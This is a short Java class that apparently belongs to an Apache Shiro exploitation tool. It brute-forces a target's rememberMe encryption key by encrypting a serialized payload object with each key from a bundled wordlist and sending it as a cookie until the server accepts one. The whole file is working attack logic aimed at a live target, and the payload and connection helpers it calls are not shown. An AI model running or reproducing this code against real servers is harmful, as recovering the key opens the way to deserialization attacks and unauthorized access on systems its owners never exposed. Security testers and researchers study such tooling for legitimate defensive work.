package core.scan;

import core.conn.ShiroHttpConnection;
import core.payload.ScanKey;
import core.scan.eneity.ShiroTarget;
import core.util.Util;

import java.io.File;
import java.io.InputStream;
import java.util.Scanner;

public class KeyScanner implements ShiroScanner {

    private final ShiroTarget target;

    public KeyScanner(ShiroTarget target) {
        this.target = target;
    }

    @Override
    public void scan() throws Exception {
        InputStream inputStream = this.getClass().getClassLoader().getResourceAsStream("key");
        assert inputStream != null;
        Scanner scanner = new Scanner(inputStream);
        String key = "";
        boolean falseKey = true;
        while (scanner.hasNextLine() && falseKey) {
            ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
            ScanKey scanKey = new ScanKey();
            key = scanner.nextLine();
            byte[] serialize = Util.serialize(scanKey.getObjectPayload(null));
            String rememberMe = Util.getRememberMe(serialize, key);
            System.out.println("[+] Test key: " + key);
            falseKey = connection.checkFalseKey(rememberMe);
        }
        if (!falseKey) {
            System.err.println("[*] Found Key: " + key);
        } else {
            System.err.println("[*] No Key Found");
        }
    }

}
